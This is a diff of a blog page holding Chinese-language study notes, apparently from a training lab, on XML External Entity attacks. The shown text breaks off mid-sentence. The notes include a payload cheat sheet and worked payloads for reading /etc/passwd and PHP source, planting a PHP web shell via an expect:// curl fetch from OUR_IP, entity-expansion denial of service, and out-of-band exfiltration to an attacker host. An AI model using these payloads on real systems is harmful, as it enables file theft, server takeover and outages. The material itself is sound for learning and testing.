@@ -19,7 +19,7 @@ The keys of an XML document, usually wrapped with (&amp;lt;&amp;#x2F;&amp;gt;) c
 
 Entity
 XML variables, usually wrapped with (&amp;amp;.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">web attacks-XXE</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-XXE"><span class="toc-text">Intro to XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-DTD"><span class="toc-text">XML DTD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-Entities"><span class="toc-text">XML Entities</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">web attacks-XXE</h1><time class="has-text-grey" datetime="2023-09-11T07:00:57.000Z">2023-09-11</time><article class="mt-2 post-content"><h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">web attacks-XXE</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-XXE"><span class="toc-text">Intro to XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-DTD"><span class="toc-text">XML DTD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-Entities"><span class="toc-text">XML Entities</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-File-Disclosure"><span class="toc-text">Local File Disclosure</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Identifying"><span class="toc-text">Identifying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-Sensitive-Files"><span class="toc-text">Reading Sensitive Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-Source-Code"><span class="toc-text">Reading Source Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution-with-XXE"><span class="toc-text">Remote Code Execution with XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other-XXE-Attacks"><span class="toc-text">Other XXE Attacks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Advanced-File-Disclosure"><span class="toc-text">Advanced File Disclosure</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Exfiltration-with-CDATA"><span class="toc-text">Advanced Exfiltration with CDATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based-XXE"><span class="toc-text">Error Based XXE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Blind-Data-Exfiltration"><span class="toc-text">Blind Data Exfiltration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Out-of-band-Data-Exfiltration"><span class="toc-text">Out-of-band Data Exfiltration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automated-OOB-Exfiltration"><span class="toc-text">Automated OOB Exfiltration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-Prevention"><span class="toc-text">XXE Prevention</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">web attacks-XXE</h1><time class="has-text-grey" datetime="2023-09-11T07:00:57.000Z">2023-09-11</time><article class="mt-2 post-content"><h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p>
 <span id="more"></span>
 
 <p>XML文档的一些关键元素，如：</p>
@@ -58,6 +58,34 @@ XML variables, usually wrapped with (&amp;amp;.."><meta name="generator" content
 </tr>
 </tbody></table>
 <p>此外，一些字符被用作XML文档结构的一部分，如&lt;、&gt;、&amp;或“。因此，如果我们需要在XML文档中使用它们，我们应该将它们替换为相应的实体引用（例如&amp;lt；、&amp;gt；、&amp;amp；、&amp;quot；）。最后，我们可以在&lt;！–和–&gt;之间的XML文档中编写注释，类似于HTML文档。</p>
+<h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><table>
+<thead>
+<tr>
+<th><strong>Code</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost/email.dtd&quot;&gt;</code></td>
+<td>Define External Entity to a URL</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td>
+<td>Define External Entity to a file path</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</code></td>
+<td>Read PHP source code with base64 encode filter</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></td>
+<td>Reading a file through a PHP error</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></td>
+<td>Reading a file OOB exfiltration</td>
+</tr>
+</tbody></table>
 <h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>XML文档类型定义（DTD）允许根据预定义的文档结构验证XML文档。预定义的文档结构可以在文档本身或外部文件中定义。下面是我们前面看到的XML文档的DTD示例：</p>
 <pre><code class="xml">&lt;!DOCTYPE email [
   &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;
@@ -94,4 +122,209 @@ XML variables, usually wrapped with (&amp;amp;.."><meta name="generator" content
 </code></pre>
 <p>注意：我们也可以使用PUBLIC关键字而不是SYSTEM来加载外部资源，后者用于公开声明的实体和标准，例如语言代码（lang&#x3D;“en”）。</p>
 <p>这与文档中定义的内部XML实体类似。当我们引用外部实体（例如&amp;signature；）时，解析器会用存储在外部文件中的值（例如signature.txt）替换该实体。当在服务器端解析XML文件时，在SOAP（XML）API或web表单等情况下，实体可以引用存储在后端服务器上的文件，当我们引用该实体时，最终可能会向我们披露该文件。</p>
+<h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当web应用程序信任来自用户输入的未过滤的XML数据时，我们可能能够引用外部XMLDTD文档并定义新的自定义XML实体。假设我们可以定义新的实体并将它们显示在网页上。在这种情况下，我们还应该能够定义外部实体，并使它们引用本地文件，当显示本地文件时，该文件应该在后端服务器上向我们显示该文件的内容。 让我们看看如何识别潜在的XXE漏洞，并利用它们从后端服务器读取敏感文件。</p>
+<h2 id="Identifying"><a href="#Identifying" class="headerlink" title="Identifying"></a>Identifying</h2><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121003069.jpeg" alt="xxe_request" style="zoom:150%;" />
+
+<p>正如我们所看到的，该表单似乎正在以XML格式将我们的数据发送到web服务器，使其成为潜在的XXE测试目标。假设web应用程序使用过时的XML库，并且它没有对XML输入应用任何过滤器或净化。在这种情况下，我们可能能够利用这种XML表单来读取本地文件。 </p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121004984.jpeg" alt="xxe_response"></p>
+<p>我们看到电子邮件元素的值正在页面上显示给我们。要将外部文件的内容打印到页面上，我们应该注意显示了哪些元素，这样我们就知道要注入哪些元素。在某些情况下，可能不会显示任何元素，我们将在接下来的部分中介绍如何利用这些元素。 目前，我们知道，无论我们在<email></email>元素中放置什么值，都会显示在HTTP响应中。因此，让我们尝试定义一个新的实体，然后将其用作电子邮件元素中的变量，看看它是否被我们定义的值所取代。为此，我们可以使用上一节中学到的内容来定义新的XML实体，并在XML输入的第一行之后添加以下行：</p>
+<pre><code class="xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;
+]&gt;
+</code></pre>
+<blockquote>
+<p>注意：在我们的示例中，HTTP请求中的XML输入没有在XML数据本身中声明DTD，也没有在外部引用DTD，所以我们在定义实体之前添加了一个新的DTD。如果DOCTYPE已经在XML请求中声明，我们只需要向其中添加ENTITY元素。</p>
+</blockquote>
+<p>现在，我们应该有一个名为company的新XML实体，我们可以使用&amp;company；来引用它；。因此，与其在电子邮件元素中使用我们的电子邮件，不如让我们尝试使用&amp;company；，看看它是否会被我们定义的值（Inlane Freight）所取代：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121008563.jpeg" alt="new_entity"></p>
+<p>正如我们所看到的，响应确实使用了我们定义的实体（Inlane Freight）的值，而不是显示&amp;company；，表明我们可以注入XML代码。相比之下，非易受攻击的web应用程序会将（&amp;company；）显示为原始值。这证实了我们正在处理一个易受XXE攻击的web应用程序。</p>
+<blockquote>
+<p>注意：有些web应用程序在HTTP请求中可能默认为JSON格式，但仍可能接受其他格式，包括XML。因此，即使web应用程序以JSON格式发送请求，我们也可以尝试将Content-Type标头更改为application&#x2F;xml，然后使用在线工具将JSON数据转换为xml。如果web应用程序确实接受了带有XML数据的请求，那么我们也可以针对XXE漏洞对其进行测试，这可能会揭示一个意想不到的XXE漏洞。</p>
+</blockquote>
+<h2 id="Reading-Sensitive-Files"><a href="#Reading-Sensitive-Files" class="headerlink" title="Reading Sensitive Files"></a>Reading Sensitive Files</h2><p>现在我们可以定义新的内部XML实体了，让我们看看是否可以定义外部XML实体。这样做与我们之前所做的非常相似，但我们只需添加SYSTEM关键字并在其后面定义外部引用路径，正如我们在上一节中所学到的：</p>
+<pre><code class="xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+</code></pre>
+<blockquote>
+<p>提示：在某些Java web应用程序中，我们还可以指定一个目录而不是文件，并且我们将获得一个目录列表，这对于定位敏感文件非常有用。</p>
+</blockquote>
+<h2 id="Reading-Source-Code"><a href="#Reading-Source-Code" class="headerlink" title="Reading Source Code"></a>Reading Source Code</h2><p>本地文件公开的另一个好处是能够获得web应用程序的源代码。这将使我们能够执行白盒渗透测试，以揭示web应用程序中的更多漏洞，或者至少揭示数据库密码或API密钥等秘密配置。 因此，让我们看看是否可以使用相同的攻击来读取index.php文件的源代码，如下所示：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121012371.jpeg" alt="file_php"></p>
+<p>正如我们所看到的，这并没有奏效，因为我们没有得到任何内容。之所以发生这种情况，是因为我们引用的文件不是正确的XML格式，因此无法将其作为外部XML实体进行引用。&#x3D;&#x3D;如果一个文件包含一些XML的特殊字符（例如&lt;&#x2F;&gt;&#x2F;&amp;），它将破坏外部实体引用，并且不用于引用。&#x3D;&#x3D;此外，我们不能读取任何二进制数据，因为它也不符合XML格式。 幸运的是，PHP提供了包装过滤器，允许我们对某些资源（包括文件）进行base64编码，在这种情况下，最终的base64输出不应破坏XML格式。为此，我们将使用PHP的php:&#x2F;&#x2F;filter&#x2F;包装。有了这个过滤器，我们可以指定convert.base64-encode编码器作为我们的过滤器，然后添加一个输入资源（例如resource&#x3D;index.php），如下所示：</p>
+<h2 id="Remote-Code-Execution-with-XXE"><a href="#Remote-Code-Execution-with-XXE" class="headerlink" title="Remote Code Execution with XXE"></a>Remote Code Execution with XXE</h2><p>除了读取本地文件外，我们还可以通过远程服务器执行代码。最简单的方法是通过调用我们的服务器来寻找ssh密钥，或者尝试在基于Windows的web应用程序中使用哈希窃取技巧。如果这些都不起作用，我们仍然&#x3D;&#x3D;可以通过PHP:&#x2F;&#x2F;expect过滤器在基于PHP的web应用程序上执行命令&#x3D;&#x3D;，尽管这需要安装并启用PHP expect模块。 如果XXE直接打印其输出“如本节所示”，那么我们可以执行如下基本命令expect:&#x2F;&#x2F;id，并且页面应该打印命令输出。但是，如果我们无法访问输出，或者需要执行更复杂的命令“例如reverse shell”，则XML语法可能会中断，该命令可能无法执行。 将XXE转换为RCE的最有效方法是从服务器中获取一个web外壳并将其写入web应用程序，然后我们可以与它交互以执行命令。为此，我们可以先编写一个基本的PHP web shell，然后启动一个python web服务器，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.php
+Tanin@htb[/htb]$ sudo python3 -m http.server 80
+</code></pre>
+<p>现在，我们可以使用以下XML代码来执行一个curl命令，该命令将我们的web shell下载到远程服务器：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM &quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;
+]&gt;
+&lt;root&gt;
+&lt;name&gt;&lt;/name&gt;
+&lt;tel&gt;&lt;/tel&gt;
+&lt;email&gt;&amp;company;&lt;/email&gt;
+&lt;message&gt;&lt;/message&gt;
+&lt;/root&gt;
+</code></pre>
+<blockquote>
+<p>注意：我们用$IFS替换了上面XML代码中的所有空格，以避免破坏XML语法。此外，许多其他字符（如|、&gt;和{）可能会破坏代码，因此我们应该避免使用它们。</p>
+</blockquote>
+<p>注意：expect模块在现代PHP服务器上默认不会启用&#x2F;安装，因此这种攻击可能并不总是有效的。这就是为什么XXE通常用于披露敏感的本地文件和源代码，这可能会揭示额外的漏洞或获得代码执行的方式。</p>
+<h2 id="Other-XXE-Attacks"><a href="#Other-XXE-Attacks" class="headerlink" title="Other XXE Attacks"></a>Other XXE Attacks</h2><p>另一种经常通过XXE漏洞进行的常见攻击是SSRF利用，该漏洞用于枚举本地打开的端口，并通过XXE弱点访问其页面和其他受限网页。服务器端攻击模块完全涵盖了SSRF，XXE攻击也可以采用相同的技术。 最后，XXE攻击的一个常见用途是对托管web服务器造成拒绝服务（DOS），使用以下有效载荷：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY a0 &quot;DOS&quot; &gt;
+  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
+  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
+  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;
+  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;
+  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;
+  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;
+  &lt;!ENTITY a9 &quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;        
+  &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;        
+]&gt;
+&lt;root&gt;
+&lt;name&gt;&lt;/name&gt;
+&lt;tel&gt;&lt;/tel&gt;
+&lt;email&gt;&amp;a10;&lt;/email&gt;
+&lt;message&gt;&lt;/message&gt;
+&lt;/root&gt;
+</code></pre>
+<p>这个有效负载将a0实体定义为DOS，在a1中多次引用它，在a2中引用a1，以此类推，直到后端服务器的内存由于自引用循环而耗尽。然而，这种攻击不再适用于现代web服务器（例如Apache），因为它们可以防止实体自引用。</p>
+<h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有XXE漏洞都可以直接利用，正如我们在上一节中所看到的那样。有些文件格式可能无法通过基本的XXE读取，而在其他情况下，web应用程序在某些情况下可能不会输出任何输入值，因此我们可能会试图通过错误来使用它。</p>
+<h2 id="Advanced-Exfiltration-with-CDATA"><a href="#Advanced-Exfiltration-with-CDATA" class="headerlink" title="Advanced Exfiltration with CDATA"></a>Advanced Exfiltration with CDATA</h2><p>在上一节中，我们看到了如何使用PHP过滤器对PHP源文件进行编码，以便它们在被引用时不会破坏XML格式，这（正如我们所看到的）阻止了我们读取这些文件。但是其他类型的Web应用程序呢？我们可以使用另一种方法为任何web应用程序后端提取任何类型的数据（包括二进制数据）。要输出不符合XML格式的数据，我们可以使用CDATA标记（例如&lt;！[CDATA[file_content]]）包装外部文件引用的内容。通过这种方式，XML解析器将考虑这部分原始数据，这些数据可能包含任何类型的数据，包括任何特殊字符。 解决这个问题的一个简单方法是用&lt;！[CDATA[，一个带有]]&gt;的结束内部实体，然后将我们的外部实体文件放在两者之间，它应该被视为CDATA元素，如下所示：</p>
+<pre><code class="xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;
+  &lt;!ENTITY file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;
+  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;
+  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;
+]&gt;
+</code></pre>
+<p>之后，如果我们引用&amp;joind；实体，它应该包含我们的转义数据。然而，这是行不通的，因为XML阻止连接内部和外部实体，所以我们必须找到更好的方法。 为了绕过这一限制，我们可以使用XML参数实体，这是一种特殊类型的实体，以%字符开头，只能在DTD中使用。参数实体的独特之处在于，如果我们从外部源（例如，我们自己的服务器）引用它们，那么所有这些实体都将被视为外部实体，并且可以连接，如下所示：</p>
+<pre><code class="xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;
+</code></pre>
+<p>因此，让我们尝试读取submitDetails.php文件，方法是首先将上述行存储在DTD文件（例如xxe.DTD）中，将其托管在我们的机器上，然后将其作为目标web应用程序上的外部实体引用，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39; &gt; xxe.dtd
+Tanin@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<p>现在，我们可以引用我们的外部实体（xxe.dtd），然后打印&amp;joind；我们在上面定义的实体，它应该包含submitDetails.php文件的内容，如下所示：</p>
+<pre><code class="xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;
+  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt; &lt;!-- reference external file --&gt;
+  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!-- append the end of the CDATA tag --&gt;
+  &lt;!ENTITY % xxe SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt; &lt;!-- reference our external DTD --&gt;
+  %xxe;
+]&gt;
+...
+&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;
+</code></pre>
+<p>一旦我们编写了xxe.dtd文件，并将其托管在我们的机器上，然后将上面的行添加到我们对易受攻击的web应用程序的HTTP请求中，我们就可以最终获得submitDetails.php文件的内容：</p>
+<blockquote>
+<p>注意：在一些现代web服务器中，我们可能无法读取某些文件（如index.php），因为web服务器将防止由文件&#x2F;实体自引用（即XML实体引用循环）引起的DOS攻击，如前一节所述。</p>
+</blockquote>
+<p>当基本的XXE方法不起作用或处理其他web开发框架时，这个技巧会变得非常方便。尝试使用此技巧读取其他文件。</p>
+<h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>我们可能会遇到的另一种情况是，web应用程序可能不会编写任何输出，因此我们无法控制任何XML输入实体来编写其内容。在这种情况下，我们将对XML输出视而不见，因此无法使用我们通常的方法检索文件内容。 如果web应用程序显示运行时错误（例如，PHP错误），并且没有对XML输入进行适当的异常处理，那么我们可以使用此缺陷读取XXE漏洞的输出。如果web应用程序既不编写XML输出也不显示任何错误，那么我们将面临完全盲目的情况，我们将在下一节中对此进行讨论。 让我们考虑一下本节末尾&#x2F;error中的练习，其中没有任何XML输入实体显示在屏幕上。因此，我们没有可以控制的实体来编写文件输出。首先，让我们尝试发送格式错误的XML数据，并查看web应用程序是否显示任何错误。为此，我们可以删除任何关闭标记，更改其中一个，使其不关闭（例如，<roo>而不是<root>），或者仅引用不存在的实体，如下所示：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121101005.jpeg" alt="cause_error"></p>
+<p>我们看到，我们确实导致web应用程序显示错误，而且它还显示了web服务器目录，我们可以使用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞来泄露文件内容。要做到这一点，我们将使用与之前使用的技术类似的技术。首先，我们将托管一个DTD文件，该文件包含以下有效负载：</p>
+<pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;
+&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;
+</code></pre>
+<p>上面的负载定义了文件参数实体，然后将其与一个不存在的实体连接。在我们之前的练习中，我们连接了三根弦。在这种情况下，%nonExistingEntity；不存在，所以web应用程序会抛出一个错误，说这个实体不存在，以及我们加入的%file；作为错误的一部分。还有许多其他变量可能会导致错误，比如错误的URI或引用文件中有错误的字符。 现在，我们可以调用外部DTD脚本，然后引用错误实体，如下所示：</p>
+<pre><code class="xml">&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;
+  %remote;
+  %error;
+]&gt;
+</code></pre>
+<p>一旦我们像前面那样托管DTD脚本，并将上述有效负载作为XML数据发送（不需要包括任何其他XML数据），我们将获得&#x2F;etc&#x2F;hosts文件的内容</p>
+<p>这种方法也可以用于读取文件的源代码。我们所要做的就是更改DTD脚本中的文件名，以指向我们想要读取的文件（例如“file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;submitDetails.php“）。然而，这种方法不如以前读取源文件的方法可靠，因为它可能有长度限制，而且某些特殊字符仍然可能会破坏它。</p>
+<h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>在上一节中，我们看到了一个盲XXE漏洞的示例，在该漏洞中，我们没有收到任何包含任何XML输入实体的输出。由于web服务器显示PHP运行时错误，我们可以使用此缺陷从显示的错误中读取文件的内容。在本节中，我们将了解如何在完全盲目的情况下获取文件的内容，在这种情况下，我们既不会获得任何XML实体的输出，也不会显示任何PHP错误。</p>
+<h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><p>如果我们试图通过在&#x2F;wind上找到的练习重复任何方法，我们会很快注意到它们似乎都不起作用，因为我们无法在web应用程序响应上打印任何内容。对于这种情况，我们可以使用一种称为带外（OOB）数据过滤的方法，该方法通常用于具有许多网络攻击的类似盲情况，如盲SQL注入、盲命令注入、盲XSS，当然还有盲XXE。跨站点脚本（XSS）和Whitebox Pentesting 101:Command Injections模块都讨论了类似的攻击，这里我们将利用类似的攻击进行轻微修改，以适应我们的XXE漏洞。 在我们之前的攻击中，我们使用了带外攻击，因为我们在机器中托管了DTD文件，并使web应用程序连接到我们（因此是带外）。所以，我们这次的进攻将非常相似，只有一个显著的区别。我们将使web应用程序向我们的web服务器发送一个web请求，其中包含我们正在读取的文件的内容，而不是让web应用程序将我们的文件实体输出到特定的XML实体。 为此，我们可以首先为正在读取的文件的内容使用一个参数实体，同时使用PHP过滤器对其进行base64编码。然后，我们将创建另一个外部参数实体并将其引用到我们的IP，并将文件参数值作为通过HTTP请求的URL的一部分，如下所示：</p>
+<pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;
+</code></pre>
+<p>例如，如果我们要读取的文件的内容为XXE_SAMPLE_DATA，那么文件参数将保存其base64编码的数据（WFhFX1NBTVBMRV9EQVRB）。当XML试图从我们的机器引用外部oob参数时，它将请求<a target="_blank" rel="noopener" 